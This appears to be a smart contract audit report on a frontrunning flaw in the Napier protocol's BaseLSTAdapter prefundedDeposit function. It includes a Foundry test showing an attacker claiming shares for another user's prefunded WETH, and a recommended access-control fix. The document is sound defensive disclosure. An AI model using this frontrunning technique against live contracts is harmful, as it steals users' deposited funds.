Fit Tin Chipmunk

medium

# Prefunded deposits to children of `BaseLSTAdapter` could be lost and shares stolen

## Summary
Transfers of underlying token (WETH) to `BaseLSTAdapter`'s child contracts (`StEtherAdapter`, `SFrxETHAdapter`) could be lost and shares could be stolen by an arbitrary sender who invokes the `prefundedDeposit` function.

## Vulnerability Detail
The design of the `prefundedDeposit` function implies that the caller should first transfer some amount of the underlying token and after that call the `prefundedDeposit` function within the same transaction, similarly to how it is done in the `Tranche` contract:

https://github.com/sherlock-audit/2024-01-napier/blob/6313f34110b0d12677b389f0ecb3197038211e12/napier-v1/src/Tranche.sol#L206-L208

However if the `prefundedDeposit` function is not invoked within the same transaction, it could be either called by another user or frontrun by an attacker. This way the attacker will steal the shares in the adapter contract, as there aren't any deposit ownership checks or accounting present in the `prefundedDeposit` function.

https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/adapters/BaseLSTAdapter.sol#L71-L139

## Impact
Users could lose their WETH deposits to the adapter and not receive shares in return.

## Code Snippet
https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/adapters/BaseLSTAdapter.sol#L71-L139

## PoC

Add the following test in the `napier-v1/test/unit/adapters/BaseTestLSTAdapter.t.sol` test and run it by using:

```bash
forge test -vvv --match-test testPrefundedDeposit_WhenUserDepositsUnderlyingInSeparateTransaction_ThenUserGetsFrontrunByAttackerAndLosesFunds
```

```solidity
    function testPrefundedDeposit_WhenUserDepositsUnderlyingInSeparateTransaction_ThenUserGetsFrontrunByAttackerAndLosesFunds()
        public
        virtual
    {
        // GIVEN
        deal(address(underlying), address(user), 1 ether);
        assertEq(underlying.balanceOf(address(user)), 1 ether);

        address attacker = makeAddr("attacker");
        assertEq(underlying.balanceOf(address(attacker)), 0);

        // WHEN
        vm.startPrank(user);
        underlying.transfer(address(adapter), 1 ether);
        vm.stopPrank();

        assertEq(underlying.balanceOf(address(user)), 0);
        assertEq(underlying.balanceOf(address(adapter)), 1 ether);

        // THEN
        vm.startPrank(attacker);
        // The user's call to adapter's `prefundedDeposit` function is actually frontrun by an attacker
        (uint256 underlyingUsed, uint256 sharesMinted) = adapter.prefundedDeposit();
        vm.stopPrank();

        assertEq(underlyingUsed, 1 ether);
        assertEq(sharesMinted, target.balanceOf(attacker));
        assertTrue(sharesMinted > 0);
        assertEq(target.balanceOf(user), 0); // User doesn't receive any shares and thus loses deposited assets.
    }
```

## Tool used

Manual Review

## Recommendation
If the `BaseLSTAdapter` and its children (`StEtherAdapter`, `SFrxETHAdapter`) is indeed expected to be used only by the `Tranche` contract, make the `prefundedDeposit` callable only by the `Tranche` contract via a modifier e.g.:

```solidity
   function prefundedDeposit() external onlyTranche nonReentrant returns (uint256, uint256) {
```